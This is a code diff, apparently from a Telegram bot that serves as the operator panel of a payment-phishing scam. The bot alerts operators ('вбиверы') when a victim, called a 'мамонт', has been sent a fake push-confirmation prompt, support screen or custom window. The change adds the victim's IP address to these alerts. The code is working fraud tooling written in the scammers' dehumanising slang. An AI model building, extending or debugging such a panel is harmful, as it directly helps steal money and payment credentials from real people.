@@ -507,32 +507,56 @@ def format_code_notification_message(page_code, code, price, currency, admin_use
     
     return message
 
-def format_push_notification_message(admin_username, name, price, currency):
+def format_push_notification_message(admin_username, name, price, currency, ip=None):
     """Формує красиве повідомлення про ПУШ"""
+    # Формуємо інформативне ім'я користувача
+    if name and name != 'Не указано':
+        user_display_name = name
+    elif ip:
+        user_display_name = f"Клієнт з IP {ip}"
+    else:
+        user_display_name = "Клієнт"
+    
     message = (
         f"🔔 Отправлен на ввод пуш\n\n"
         f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
-        f"🐘 Мамонт: {name or 'Не указано'}\n"
+        f"🐘 Мамонт: {user_display_name}\n"
         f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     return message
 
-def format_support_notification_message(admin_username, name, price, currency):
+def format_support_notification_message(admin_username, name, price, currency, ip=None):
     """Формує красиве повідомлення про ТЕХ ПОДДЕРЖКА"""
+    # Формуємо інформативне ім'я користувача
+    if name and name != 'Не указано':
+        user_display_name = name
+    elif ip:
+        user_display_name = f"Клієнт з IP {ip}"
+    else:
+        user_display_name = "Клієнт"
+    
     message = (
         f"🔔 Отправлен обратиться в ТП\n\n"
         f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
-        f"🐘 Мамонт: {name or 'Не указано'}\n"
+        f"🐘 Мамонт: {user_display_name}\n"
         f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     return message
 
-def format_text_notification_message(admin_username, name, price, currency):
+def format_text_notification_message(admin_username, name, price, currency, ip=None):
     """Формує красиве повідомлення про ТЕКСТ"""
+    # Формуємо інформативне ім'я користувача
+    if name and name != 'Не указано':
+        user_display_name = name
+    elif ip:
+        user_display_name = f"Клієнт з IP {ip}"
+    else:
+        user_display_name = "Клієнт"
+    
     message = (
         f"🔔 Отправлен на кастомное окно\n\n"
         f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
-        f"🐘 Мамонт: {name or 'Не указано'}\n"
+        f"🐘 Мамонт: {user_display_name}\n"
         f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     return message
@@ -2543,7 +2567,8 @@ async def admin_enter_text(message: types.Message):
                     admin_username=admin_username,
                     name=user_name,
                     price=event_price,
-                    currency=event_currency
+                    currency=event_currency,
+                    ip=ip
                 )
                 await bot.send_message(admin_user_id, text_message)
     
@@ -3235,7 +3260,8 @@ async def admin_action_handler(call: types.CallbackQuery):
                             admin_username=admin_username,
                             name=user_name,
                             price=event_price,
-                            currency=event_currency
+                            currency=event_currency,
+                            ip=ip
                         )
                         await bot.send_message(admin_user_id, push_message)
                         print(f'[DEBUG] Push message sent to admin {admin_user_id}')
@@ -3308,7 +3334,8 @@ async def admin_action_handler(call: types.CallbackQuery):
                                 admin_username=admin_username,
                                 name=user_name,
                                 price=event_price,
-                                currency=event_currency
+                                currency=event_currency,
+                                ip=ip
                             )
                             await bot.send_message(admin_user_id, support_message)
                             print(f'[DEBUG] Support message sent to admin {admin_user_id}')
